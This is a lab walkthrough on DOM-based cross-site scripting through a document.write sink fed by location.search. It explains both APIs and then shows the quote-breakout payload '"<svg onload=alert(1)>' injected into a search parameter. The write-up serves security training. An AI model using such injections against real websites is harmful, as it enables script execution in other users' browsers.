# DOM XSS in document.write sink using source location.search

> **************************Instructions**************************
> 
> 
> This lab contains a [DOM-based cross-site scripting](../../Cross-site%20Scripting%20(XSS)/Sub_Pages/DOM-based%20XSS.md) vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
> 
> To solve this lab, perform a [cross-site scripting](../../Cross-site%20Scripting%20(XSS)/Cross-site%20Scripting%20(XSS).md) attack that calls the `alert` function
> 

# Overview Knowledge

### document.write

`document.write()` method writes a string of text to a document stream opened by `document.open()`

Example:

```html
<html lang="en">
  <head>
    <title>Write example</title>

    <script>
      function newContent() {
        document.open();
        document.write("<h1>Out with the old, in with the new!</h1>");
        document.close();
      }
    </script>
  </head>

  <body onload="newContent();">
    <p>Some original document content.</p>
  </body>
</html>
```

Output:

```html
Some original document content.
```

### location.search

The **`search`** property of the `Location` interface is a search string, also called a *query string*; that is, a string containing a `'?'` followed by the parameters of the URL.

Example:

```jsx
// Let an <a id="myAnchor" href="/en-US/docs/Location.search?q=123"> element be in the document
const anchor = document.getElementById("myAnchor");
const queryString = anchor.search; // Returns:'?q=123'

// Further parsing:
const params = new URLSearchParams(queryString);
const q = parseInt(params.get("q")); // is the number 123
```

# Lab Walkthrough

Access the ********Home******** page of the Lab:

```tsx
URL: https://0a900028049a64c5807cf35600ce000a.web-security-academy.net
```

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20images/Untitled.png)

Type a random simple string into the ************Search************ field:

```tsx
URL: https://0a900028049a64c5807cf35600ce000a.web-security-academy.net/?search=thisisDOM-basedXSS%40
```

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20images/Untitled%201.png)

Verify that your input string has been parsed into the `<img>` tag with `src` attribute:

```html
<img src="/resources/images/tracker.gif?searchTerms=thisisDOM-basedXSS@">
```

Use the `"` to break out the `<img>` tag and embed the `<svg>` with `onload` attribute to call the `alert()` function:

```
thisisDOM-basedXSS@"<svg onload=alert(1)>
```

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20images/Untitled%202.png)

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20images/Untitled%203.png)

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20images/Untitled%204.png)